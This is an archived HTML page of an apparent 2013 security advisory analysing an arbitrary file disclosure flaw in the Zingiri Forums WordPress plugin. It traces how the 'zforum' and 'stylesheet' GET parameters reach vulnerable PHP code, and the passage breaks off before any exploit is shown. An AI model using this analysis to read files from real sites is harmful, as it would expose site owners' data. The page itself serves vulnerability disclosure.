@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<!--[if IE 6]>
+<html id="ie6" lang="en-US">
+<![endif]-->
+<!--[if IE 7]>
+<html id="ie7" lang="en-US">
+<![endif]-->
+<!--[if IE 8]>
+<html id="ie8" lang="en-US">
+<![endif]-->
+<!--[if !(IE 6) | !(IE 7) | !(IE 8)  ]><!-->
+<html lang="en-US">
+<!--<![endif]-->
+<head>
+<base href="http://ceriksen.com" />
+
+<meta charset="UTF-8" />
+<meta name="viewport" content="initial-scale=1.0, width=device-width" />
+<title>WordPress Zingiri Forums arbitrary file disclosure | ceriksen.com</title>
+
+<link rel="stylesheet" type="text/css" media="all" href="http://ceriksen.com/wp-content/themes/simplex/style.css" />
+
+<!--[if lt IE 9]>
+<script src="http://ceriksen.com/wp-content/themes/simplex/js/html5.js" type="text/javascript"></script>
+<script src="http://ceriksen.com/wp-content/themes/simplex/js/css3-mediaqueries.js"></script>
+<![endif]-->
+
+
+
+<link rel='stylesheet' id='crayon-css'  href='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=2.5.0' type='text/css' media='all' />
+<link rel='stylesheet' id='crayon-theme-twilight-css'  href='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/themes/twilight/twilight.css?ver=2.5.0' type='text/css' media='all' />
+<link rel='stylesheet' id='crayon-font-monaco-css'  href='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=2.5.0' type='text/css' media='all' />
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/jquery.js?ver=1.10.2'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var quicktagsL10n = {"closeAllOpenTags":"Close all open tags","closeTags":"close tags","enterURL":"Enter the URL","enterImageURL":"Enter the URL of the image","enterImageDescription":"Enter a description of the image","fullscreen":"fullscreen","toggleFullscreen":"Toggle fullscreen mode","textdirection":"text direction","toggleTextdirection":"Toggle Editor Text Direction"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/quicktags.min.js?ver=3.8.3'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
+var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
+var CrayonTagEditorSettings = {"home_url":"http:\/\/ceriksen.com","css":"crayon-te","css_selected":"crayon-selected","code_css":"#crayon-code","url_css":"#crayon-url","url_info_css":"#crayon-te-url-info","lang_css":"#crayon-lang","title_css":"#crayon-title","mark_css":"#crayon-mark","range_css":"#crayon-range","inline_css":"crayon-inline","inline_hide_css":"crayon-hide-inline","inline_hide_only_css":"crayon-hide-inline-only","hl_css":"#crayon-highlight","switch_html":"#content-html","switch_tmce":"#content-tmce","tinymce_button":"a.mce_crayon_tinymce","submit_css":"#crayon-te-ok","cancel_css":"#crayon-te-cancel","content_css":"#crayon-te-content","dialog_title_css":"#crayon-te-title","submit_wrapper_css":"#crayon-te-submit-wrapper","data_value":"data-value","attr_sep":":","css_sep":"_","fallback_lang":"default","dialog_title_add":"Add Crayon Code","dialog_title_edit":"Edit Crayon Code","submit_add":"Add","submit_edit":"Save","bar":"#crayon-te-bar","bar_content":"#crayon-te-bar-content","extensions":{"scpt":"applescript","applescript":"applescript","swf":"as","fla":"as","cs":"c#","h":"c++","hh":"c++","hpp":"c++","hxx":"c++","h++":"c++","cc":"c++","cpp":"c++","cxx":"c++","c++":"c++","pas":"delphi","java":"java","class":"java","jar":"java","mv":"miva","mvc":"miva","mvt":"miva","m":"objc","mm":"objc","pl":"perl","py":"python","pyw":"python","pyc":"python","pyo":"python","pyd":"python","rb":"ruby","rbx":"ruby","rhtml":"ruby","vbs":"vb"}};
+var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
+var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.te.min.js?ver=2.5.0'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/comment-reply.min.js?ver=3.8.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-content/themes/simplex/lib/js/jquery.fitvids.js?ver=3.8.3'></script>
+
+ 
+
+<link rel='next' title='WordPress Floating Social Media Link Plugins Remote File Inclusion' href='http://ceriksen.com/2013/01/12/wordpress-floating-social-media-link-plugins-remote-file-inclusion/' />
+
+<link rel='canonical' href='http://ceriksen.com/2013/01/12/wordpress-zingiri-forums-arbitrary-file-disclosure/' />
+<link rel='shortlink' href='http://ceriksen.com/?p=164' />
+<script type="text/javascript">
+var _gaq = _gaq || [];
+_gaq.push(['_setAccount', 'UA-32892239-1']);
+_gaq.push(['_trackPageview']);
+(function() {
+var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+})();
+</script>
+
+	<script type="text/javascript">
+		jQuery(document).ready(function(){
+			jQuery("#page").fitVids();	 
+		});
+	</script>	<style type="text/css">
+			#site-title a,
+		#site-description {
+			color: #e6941e !important;
+		}
+		</style>
+	
+</head>
+
+<body lang="en" class="single single-post postid-164 single-format-standard browser-chrome single-author singular">
+<div id="page" class="hfeed">
+	<header id="branding" role="banner">
+		<hgroup>
+			<h1 id="site-title"><a href="http://ceriksen.com/" title="ceriksen.com" rel="home">ceriksen.com</a></h1>
+			<h2 id="site-description"></h2>
+						
+							<form role="search" method="get" id="searchform" class="searchform" action="http://ceriksen.com/">
+				<div>
+					<label class="screen-reader-text" for="s">Search for:</label>
+					<input type="text" value="" name="s" id="s" />
+					<input type="submit" id="searchsubmit" value="Search" />
+				</div>
+			</form>					</hgroup>
+		
+		<nav id="access" role="navigation">
+			<h2 class="assistive-text">Main menu</h2>
+			<div class="skip-link screen-reader-text"><a href="#content" title="Skip to content">Skip to content</a></div>
+
+			<div class="menu"><ul><li ><a href="http://ceriksen.com/">Home</a></li></ul></div>
+
+		</nav><!-- #access -->
+		<div class="clear"></div>
+	</header><!-- #branding -->
+
+	<div id="main">
+		<div id="primary">
+			<div id="content" role="main">
+
+			
+				
+				
+<article id="post-164" class="post-164 post type-post status-publish format-standard hentry category-advisories tag-file-disclosure tag-wordpress-plugin tag-zingiri-forums">
+	<header class="entry-header">
+				<h2 class="entry-title">WordPress Zingiri Forums arbitrary file disclosure</h2>
+		
+		<div class="entry-meta">
+			<a href="http://ceriksen.com/2013/01/12/wordpress-zingiri-forums-arbitrary-file-disclosure/" title="3:43 am" rel="bookmark" class="entry-date"><time datetime="2013-01-12T03:43:07+00:00" pubdate>January 12, 2013</time></a>		</div><!-- .entry-meta -->
+	</header><!-- .entry-header -->
+
+	<div class="entry-content">
+				<p><strong>Advisory</strong></p>
+<p><a href="http://secunia.com/advisories/50833/">Secunia Advisory SA50833</p>
+<p></a></p>
+<p><strong>Analysis of vulnerability</strong></p>
+<p>The Zingiri Web Forums for WordPress writes our a header for the forum in <a href="http://plugins.svn.wordpress.org/zingiri-forum/tags/1.4.2/forum.php">forum.php</a> through adding an action to wp_head.</p><!-- Crayon Syntax Highlighter v2.5.0 -->
+
+		<div id="crayon-53c97c054abb8441237225" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+add_action('wp_head','zing_forum_header');</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c97c054abb8441237225-44">44</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c97c054abb8441237225-44"><span class="crayon-e">add_action</span><span class="crayon-sy">(</span><span class="crayon-s">'wp_head'</span><span class="crayon-sy">,</span><span class="crayon-s">'zing_forum_header'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0007 seconds] -->
+<p></p><!-- Crayon Syntax Highlighter v2.5.0 -->
+
+		<div id="crayon-53c97c054abd7179101708" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+function zing_forum_header()
+{
+	global $zing_forum_content;
+	global $zing_forum_menu;
+	$output=zing_forum_output("content");
+
+	zing_integrator_cut($output,'&lt;div id="footer"&gt;','&lt;/div&gt;'); //remove footer
+	zing_integrator_cut($output,'&lt;span class="forgot_password"&gt;','&lt;/span&gt;');
+
+	$zing_forum_content=$output;
+
+	echo '&lt;script type="text/javascript" language="javascript"&gt;';
+	echo "var zing_forum_url='".ZING_FORUM_URL."ajax/';";
+	echo "var zing_forum_index='".get_option('home')."/index.php?';";
+	echo "function zing_forum_url_ajax(s) { return zing_forum_url+s; }";
+	echo '&lt;/script&gt;';
+
+	echo '&lt;link rel="stylesheet" type="text/css" href="' . ZING_FORUM_URL . 'zing.css" media="screen" /&gt;';
+}</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c97c054abd7179101708-686">686</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abd7179101708-687">687</div><div class="crayon-num" data-line="crayon-53c97c054abd7179101708-688">688</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abd7179101708-689">689</div><div class="crayon-num" data-line="crayon-53c97c054abd7179101708-690">690</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abd7179101708-691">691</div><div class="crayon-num" data-line="crayon-53c97c054abd7179101708-692">692</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abd7179101708-693">693</div><div class="crayon-num" data-line="crayon-53c97c054abd7179101708-694">694</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abd7179101708-695">695</div><div class="crayon-num" data-line="crayon-53c97c054abd7179101708-696">696</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abd7179101708-697">697</div><div class="crayon-num" data-line="crayon-53c97c054abd7179101708-698">698</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abd7179101708-699">699</div><div class="crayon-num" data-line="crayon-53c97c054abd7179101708-700">700</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abd7179101708-701">701</div><div class="crayon-num" data-line="crayon-53c97c054abd7179101708-702">702</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abd7179101708-703">703</div><div class="crayon-num" data-line="crayon-53c97c054abd7179101708-704">704</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c97c054abd7179101708-686"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">zing_forum_header</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abd7179101708-687"><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c97c054abd7179101708-688"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">zing_forum_content</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abd7179101708-689"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">zing_forum_menu</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c97c054abd7179101708-690"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">output</span><span class="crayon-o">=</span><span class="crayon-e">zing_forum_output</span><span class="crayon-sy">(</span><span class="crayon-s">"content"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abd7179101708-691">&nbsp;</div><div class="crayon-line" id="crayon-53c97c054abd7179101708-692"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">zing_integrator_cut</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">output</span><span class="crayon-sy">,</span><span class="crayon-s">'&lt;div id="footer"&gt;'</span><span class="crayon-sy">,</span><span class="crayon-s">'&lt;/div&gt;'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">//remove footer</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abd7179101708-693"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">zing_integrator_cut</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">output</span><span class="crayon-sy">,</span><span class="crayon-s">'&lt;span class="forgot_password"&gt;'</span><span class="crayon-sy">,</span><span class="crayon-s">'&lt;/span&gt;'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c97c054abd7179101708-694">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abd7179101708-695"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">zing_forum_content</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-i">output</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c97c054abd7179101708-696">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abd7179101708-697"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">'<span class="crayon-ta">&lt;script </span><span class="crayon-e ">type</span><span class="crayon-o">=</span><span class="crayon-s">"text/javascript"</span><span class="crayon-h"> </span><span class="crayon-e ">language</span><span class="crayon-o">=</span><span class="crayon-s">"javascript"</span><span class="crayon-o">&gt;</span><span class="crayon-s">';</span></div><div class="crayon-line" id="crayon-53c97c054abd7179101708-698"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;echo "var zing_forum_url='</span><span class="crayon-s">".ZING_FORUM_URL."</span><span class="crayon-i">ajax</span><span class="crayon-c ">/';";</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abd7179101708-699"><span class="crayon-c ">&nbsp;&nbsp;&nbsp;&nbsp;echo "var zing_forum_index='".get_option('home')."/i</span><span class="crayon-v">ndex</span><span class="crayon-sy">.</span><span class="crayon-i">php</span><span class="crayon-sy">?</span><span class="crayon-s">';";</span></div><div class="crayon-line" id="crayon-53c97c054abd7179101708-700"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;echo "function zing_forum_url_ajax(s) { return zing_forum_url+s; }";</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abd7179101708-701"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;echo '</span><span class="crayon-ta">&lt;/script&gt;</span>'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c97c054abd7179101708-702">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abd7179101708-703"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">'&lt;link rel="stylesheet" type="text/css" href="'</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-v">ZING_FORUM_URL</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">'zing.css" media="screen" /&gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c97c054abd7179101708-704"><span class="crayon-sy">}</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0064 seconds] -->
+<p>So on each load of the WordPress blog it will call into zing_forum_header. The first call it makes it into zing_forum_output, which is rather long. I&#8217;ve highlighted two areas:</p><!-- Crayon Syntax Highlighter v2.5.0 -->
+
+		<div id="crayon-53c97c054abe1923410013" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+function zing_forum_output($process) {
+	global $post,$wpdb,$zing_forum_loaded,$zing_forum_to_include,$zing_forum_mode;
+
+	$postVar=array();
+	switch ($process)
+	{
+		case "content":
+			if (isset($post)) $cf=get_post_custom($post-&gt;ID);
+			if (isset($_GET['zforum']))
+			{
+				$zing_forum_to_include=$_GET['zforum'];
+				$zing_forum_mode="forum";
+			}</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c97c054abe1923410013-456">456</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abe1923410013-457">457</div><div class="crayon-num" data-line="crayon-53c97c054abe1923410013-458">458</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abe1923410013-459">459</div><div class="crayon-num" data-line="crayon-53c97c054abe1923410013-460">460</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abe1923410013-461">461</div><div class="crayon-num" data-line="crayon-53c97c054abe1923410013-462">462</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abe1923410013-463">463</div><div class="crayon-num" data-line="crayon-53c97c054abe1923410013-464">464</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abe1923410013-465">465</div><div class="crayon-num" data-line="crayon-53c97c054abe1923410013-466">466</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c97c054abe1923410013-467">467</div><div class="crayon-num" data-line="crayon-53c97c054abe1923410013-468">468</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c97c054abe1923410013-456"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">zing_forum_output</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">process</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abe1923410013-457"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">post</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-i">zing_forum_loaded</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-i">zing_forum_to_include</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-i">zing_forum_mode</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c97c054abe1923410013-458">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abe1923410013-459"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">postVar</span><span class="crayon-o">=</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c97c054abe1923410013-460"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">switch</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">process</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abe1923410013-461"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c97c054abe1923410013-462"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-s">"content"</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abe1923410013-463"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">post</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">cf</span><span class="crayon-o">=</span><span class="crayon-e">get_post_custom</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">post</span><span class="crayon-o">-&gt;</span><span class="crayon-i">ID</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c97c054abe1923410013-464"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'zforum'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abe1923410013-465"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c97c054abe1923410013-466"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">zing_forum_to_include</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'zforum'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c97c054abe1923410013-467"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">zing_forum_mode</span><span class="crayon-o">=</span><span class="crayon-s">"forum"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c97c054abe1923410013-468"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0040 seconds] -->
+<p>We can affect the value of $zing_forum_to_include through the zforum GET variable. This is then used in a big else if statement. Here is the block of code that is executed if we set that to css:</p><!-- Crayon Syntax Highlighter v2.5.0 -->
+
+		<div id="crayon-53c97c054abea355910577" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+} elseif ($zing_forum_to_include=='css') {
+		ob_end_clean();
+		if (isset($_GET['stylesheet'])) $key=$_GET['stylesheet'];
